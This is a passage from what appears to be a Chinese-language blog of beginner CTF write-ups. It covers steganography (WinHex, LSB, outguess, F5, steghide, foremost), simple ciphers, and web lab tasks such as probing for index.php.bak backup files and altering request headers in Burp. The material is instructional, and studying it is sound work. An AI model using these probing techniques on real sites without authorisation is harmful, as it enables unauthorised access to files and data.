src="https://img-blog.csdnimg.cn/20200315164836568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>flag就是这个啦。</p><h3 id="精美壁纸"><a href="#精美壁纸" class="headerlink" title="精美壁纸"></a><h3 id="3">精美壁纸</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200315165053569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br><code>Pixiv@純白可憐.jpg</code>是张图片，打开看看<br><img src="https://img-blog.csdnimg.cn/2020031516593638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>挺好看的，精美壁纸。<br>然后把它拖进winhex里<br><img src="https://img-blog.csdnimg.cn/20200315170159307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>好好检查下，然后在最后发现了信息。<br><img src="https://img-blog.csdnimg.cn/20200315170345563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>题里说了压缩包密码，就找压缩包。<br><img src="https://img-blog.csdnimg.cn/20200315170712241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后查找<code>504B0304</code>,<br><img src="https://img-blog.csdnimg.cn/20200315170817336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>找到了<img src="https://img-blog.csdnimg.cn/20200315170900267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>再找文件尾，zip的文件结尾一般都是`504B0506``开头，在意同样的办法找到文件尾就行。<br>然后提取压缩包<br>选中文件头到文件尾的部分右键单击，选择编辑，然后复制选块<br>，至新文件。<br><img src="https://img-blog.csdnimg.cn/20200315171320908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后打开保存的压缩包，<br><img src="https://img-blog.csdnimg.cn/20200315173010511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>flag文本加密了，password is picture ID.<br>密码是图片的ID，复制一下 图片的名字，百度一下。<br><img src="https://img-blog.csdnimg.cn/20200315172548616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>进入网页之后找到那张图片，看下它的ID，就是压缩包的密码了<br><img src="https://img-blog.csdnimg.cn/20200315172532890.png" alt="在这里插入图片描述" loading="lazy"><br>打开文本<br><img src="https://img-blog.csdnimg.cn/20200315173227251.png" alt="在这里插入图片描述" loading="lazy"><br>还有密码。这个密码，我做的时候可是好一顿查啊。<br>Unicode转码:<br>hgame{Do_y0u_KnOW_uNiC0d3?}</p><h3 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a><h3 id="4">Ook!</h3></h3><p>bugku的一道题，第一眼看见着实吓到我了，自己看看就明白了。<br>不过真的是🐶🐶🐶，弄那么长，吓唬谁呢，纸老虎，在线网址<br><a href="https://tool.bugku.com/brainfuck/">直接破解</a>。没啥说的，啥也不是。</p><h3 id="rot13加密解密"><a href="#rot13加密解密" class="headerlink" title="rot13加密解密"></a><h3 id="5">rot13加密解密</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200316102443460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="网络安全实验室基础题第二道" loading="lazy"><br>做的第一道考察rot13的题目，就是偏移13位的凯撒密码。<br><img src="https://img-blog.csdnimg.cn/20200316102709994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="千千秀字——凯撒密码" loading="lazy"><br>拿到key。</p><h3 id="MD5加密解密"><a href="#MD5加密解密" class="headerlink" title="MD5加密解密"></a><h3 id="6">MD5加密解密</h3></h3><p><img src="https://img-blog.csdnimg.cn/2020031610301915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="网络安全实验室基础题" loading="lazy"><br>直接搜在线解密MD5工具<a href="https://www.cmd5.com/">直达链接</a><br><img src="https://img-blog.csdnimg.cn/20200316103129402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>key：bighp</p><h3 id="种族歧视"><a href="#种族歧视" class="headerlink" title="种族歧视"></a><h3 id="7">种族歧视</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200316103329918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="网络安全实验室" loading="lazy"><br>f12点击控制台，查看一下。<img src="https://img-blog.csdnimg.cn/20200316103446673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>发现没法操作。那就抓包，<br><img src="https://img-blog.csdnimg.cn/20200316103915181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>将这里改成：<code>en-US,en;q=0.9</code>然后go<br><img src="https://img-blog.csdnimg.cn/20200316104251651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>拿到key。</p><h3 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a><h3 id="8">备份文件</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200316113003278.png" alt="来自攻防世界web新手入门" loading="lazy"><br>开启在线环境，进入之后看到<br><img src="https://img-blog.csdnimg.cn/20200316113105910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>正确姿势：在这里加上<code>/index.php.bak</code><img src="https://img-blog.csdnimg.cn/2020031611332376.png" alt="在这里插入图片描述" loading="lazy"><br>然后会自动下载一个文件，在本地用记事本打开<br><img src="https://img-blog.csdnimg.cn/20200316113702428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>得到flag。<br>常见的文件备份扩展名<br><code>.rar</code>,<code>.zip</code>,<code>.7z</code>,<code>.tar.gz</code>,<code>.bak</code>,<code>.swp</code>,<code>.txt</code>,<code>.html</code></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a><h3 id="9">cookie</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200316121442553.png" alt="攻防世界web新手入门" loading="lazy"><br>进去后看到“你知道什么是cookie吗？”<br><img src="https://img-blog.csdnimg.cn/20200316121532454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>明显让查看cookie，最简单的办法，f12，到Console（控制台）输入<code>document.cookie</code>，就可以直接看到cookie了，也不用到处找，<br><img src="https://img-blog.csdnimg.cn/20200316122041511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>cookie.php信息提示。然后就把原来的url后面加上<code>cookie.php</code>回车。<img src="https://img-blog.csdnimg.cn/20200316122332167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后就根据提示查看http的response呗。<br><code>f12</code>–<code>Network</code>–<code>Ctrl+R</code>–<code>cookie.php</code>–<code>左键单击</code>然后就能看到flag了<br><img src="https://img-blog.csdnimg.cn/20200316122742147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a><h3 id="10">simple_js</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200325082756484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开后弹了一个窗口，前段时间学过xss 然后就想到了Javascript的弹窗代码<img src="https://img-blog.csdnimg.cn/20200325083009529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>先随便输个密码，<br><img src="https://img-blog.csdnimg.cn/20200325083046673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>再看代码，f12<br><img src="https://img-blog.csdnimg.cn/20200325083214500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>果然是个弹窗的JavaScript代码，一眼就看到了那个很长的一串数字。仔细看就会发现它是十六进制数，先转换，，，<br><img src="https://img-blog.csdnimg.cn/20200325083409439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>将解出来的十进制数对照ascii码表，可以在Excel表格中转换，比较快<br><img src="https://img-blog.csdnimg.cn/20200325084936296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a><h3 id="11">baby_web</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200325090806399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个提示初始页面，然后看了进入场景看看，<br><img src="https://img-blog.csdnimg.cn/20200325090914758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后呢，，，对于这种，直接f12看源码，然而扫荡一波，什么都没找到。<br>然后再想想提示，初始页面，就是知道是啥，但说不上来那种感觉，然后我就去百度初始页面，刚开始进入浏览器显示的页面，还看到有个大哥在问怎么把百度设置为初始页面呢，这么一看，突然想到刚刚那个url好像有点不对劲，然后对比了一下题目给的url和进入那个链接浏览器显示的url，发现不一样了，多了个<code>/1.php</code>一定是中间跳转了，我之前拿我的物理机当靶机玩xss的时候玩过这个，让用户点击一个链接或者其他的图片之类的东西后直接跳转另一个页面，是反射型xss。<br>这里跳转就burp抓包。<br><img src="https://img-blog.csdnimg.cn/20200325091902101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>右键单击然后转到Repeater里面<br><img src="https://img-blog.csdnimg.cn/20200325092108118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这多好，嘿嘿。</p><h3 id="N种解决方法"><a href="#N种解决方法" class="headerlink" title="N种解决方法"></a><h3 id="12">N种解决方法</h3></h3><p>打开文件是个不能运行的一个应用程序，我就先把它重命名为文本文件了，然后就可以打开了<br><img src="https://img-blog.csdnimg.cn/20200325112443857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到了base64然后我就把base64 后面的内容全都放在在线解密网站去解密了。解出来一堆乱码，，，我看到这些乱码，好像是在winhex里打开的样子，所以我就又打开winhex（看的方便点）但是找半天，发现，没有隐藏压缩包、图片什么的，烦，，，，这个到底考的什么？？？有一句话说的真没错，把人逼急了，什么都做的出来，我就全选复制，整个扔浏览器里跑了。结果wc了，整出来个二维码，激动，，差点鼠标都给扔了。<br>颤抖的手掏出我的诺基亚一扫，哎，美滋滋。<br><img src="https://img-blog.csdnimg.cn/20200325114540543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="小姐姐—y1ng"><a href="#小姐姐—y1ng" class="headerlink" title="小姐姐—y1ng"></a><h3 id="13">小姐姐—y1ng</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200403190217520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这是之前比赛的题，然而我根本就没看，（我菜我有理╭(╯^╰)╮）<br><img src="https://img-blog.csdnimg.cn/20200403192432948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个看着有点别扭，但是我做的时候没想到什么思路，就还是分离一下看看能不能找到其他的信息，但是并没有，然后就放winhex里找信息了。找半天也没找到，我懵了，，，，找wp，结果发现，直接搜就行了。但是我的问题又来了，（wp上说的是直接搜BJD）<br><img src="https://img-blog.csdnimg.cn/20200403193253585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>为什么没有？我当时可迷！！！<br>然后我尝试搜了十六进制的424A44(BJD)就找到了。但是我又在下图的位置再次尝试了搜BJD，但是，但是<code>******</code>还是没有。奇怪。<br><img src="https://img-blog.csdnimg.cn/20200403193148918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="看图片属性"><a href="#看图片属性" class="headerlink" title="看图片属性"></a><h3 id="14">看图片属性</h3></h3><p>右键找到属性，看详细信息，备注就是信息</p><h3 id="SL藏在字节中"><a href="#SL藏在字节中" class="headerlink" title="SL藏在字节中"></a><h3 id="15">SL藏在字节中</h3></h3><p>winhex打开图片搜文本SL，flag就在中间的位置。（多搜几次）</p><h3 id="修改图片宽或高"><a href="#修改图片宽或高" class="headerlink" title="修改图片宽或高"></a><h3 id="16">修改图片宽或高</h3></h3><p>拖进winhex中，在改高度的地方将高度改高一点<br><img src="https://img-blog.csdnimg.cn/2020040508050654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="补充头部"><a href="#补充头部" class="headerlink" title="补充头部"></a><h3 id="17">补充头部</h3></h3><p>还是将图片在winhex打开，提示的这么明显了，是png格式，在头部位置右键单击，然后选编辑，粘贴0字节<br><img src="https://img-blog.csdnimg.cn/202004050759156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>粘贴4个，然后png格式添加<code>89504E47</code><br><img src="https://img-blog.csdnimg.cn/20200405080209679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>其他格式<br><img src="https://img-blog.csdnimg.cn/20200405081911268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>解题姿势是不变的</p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a><h3 id="18">LSB</h3></h3><p>stegsolve打开进行转换看到在0的有效位跟其他的有点不同的是多了最上面的一串乱七八糟的东西，其他（green,blue）的都有（而且提示也是最低有效位）<br><img src="https://img-blog.csdnimg.cn/20200405082345463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后提取出来就行<br><img src="https://img-blog.csdnimg.cn/2020040508275610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="使用outguess工具"><a href="#使用outguess工具" class="headerlink" title="使用outguess工具"></a><h3 id="19">使用outguess工具</h3></h3><p>之前见了一个这样的题，那个题目特别注重了“猜”这个字。那个就是outguess。<br>看这个，一张图片<br><img src="https://img-blog.csdnimg.cn/20200405083250130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>首先想到，outguess是要有密码的，不能盲目的一顿乱操作。<br>就一张图片，分离不出任何信息，然后想到了备注<br><img src="https://img-blog.csdnimg.cn/2020040508344258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>新佛曰。新与佛论禅在线网站可解<a href="http://hi.pcmoe.net/buddha.html">新约佛论禅</a>解出来是<code>lemon</code><br>kali解题<br>payload<br><code>outguess -k &#39;密钥&#39; -r 图片 flag.txt</code>解密的<br><code>outguess -k &quot;secret key&quot; -d flag.txt 0.jpg 1.jpg</code>加密的<br>加密之后，0.jpg会覆盖1.jpg,<br>flag.txt中的内容是要隐藏的文本<br><img src="https://img-blog.csdnimg.cn/20200405084558950.png" alt="Augenstern" loading="lazy"><br>在outguess的文件夹里找到<code>flag.txt</code><br><img src="https://img-blog.csdnimg.cn/20200405084726252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h3 id="使用F5-steganography工具"><a href="#使用F5-steganography工具" class="headerlink" title="使用F5-steganography工具"></a><h3 id="20">使用F5-steganography工具</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405085529970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>F5隐写同样是需要一个密钥，就一张图片，那就在这里下功夫。先分离，发现没东西，再看备注（虽然知道是无用还是试试）。最后才发现它就在最显眼的地方。<img src="https://img-blog.csdnimg.cn/20200405085831493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>payload<br><code>java Extract picture.jpg -p key</code><br><img src="https://img-blog.csdnimg.cn/20200405090417678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>在f5的文件目录中找到output.txt就是flag。</p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a><h3 id="21">签到题</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405091200160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>winhex打开图片，没给其他信息的话，一般不难找，头部没有，到最尾部看。<img src="https://img-blog.csdnimg.cn/20200405091319823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>是HTML编码，在线网站解码就行了。</p><h3 id="文件分离"><a href="#文件分离" class="headerlink" title="文件分离"></a><h3 id="22">文件分离</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405091459994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>foremost分离<br><img src="https://img-blog.csdnimg.cn/20200405091605300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag拿到（个人感觉windows上使用foremost比binwalk方便多了。）</p><h3 id="画图"><a href="#画图" class="headerlink" title="画图"></a><h3 id="23">画图</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405091812315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>下载好gnuplot后，然后开始看图片。还是第一步分离了一下。没想到还真有东西，然后看压缩包，解压出来一个txt文本。特别长。<br><img src="https://img-blog.csdnimg.cn/20200405092212849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>没头绪，不过应该没有加密了。就去看看gnuplot怎么用的吧。看学长提示的那个博客看过去，看过后，还阔以，明白了。<br>先下载个Notepad++再说，<br><img src="https://img-blog.csdnimg.cn/20200405092625107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>转换后<br><img src="https://img-blog.csdnimg.cn/20200405092711767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>保存，打开gnuplot程序<br><img src="https://img-blog.csdnimg.cn/2020040509291025.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>回车画图<br><img src="https://img-blog.csdnimg.cn/20200405092927996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>微信扫吧，别用QQ，害，明明是一个“妈”生的，差距怎么就这么大</p><h3 id="使用steghide工具"><a href="#使用steghide工具" class="headerlink" title="使用steghide工具"></a><h3 id="24">使用steghide工具</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405093213829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>因为steghide解题也是要密钥的，所以先找图片的信息。分离，没有。下一个，看备注。这个找到了<br><img src="https://img-blog.csdnimg.cn/2020040509361965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>先在题中给的链接中学习一下怎么使用，<a 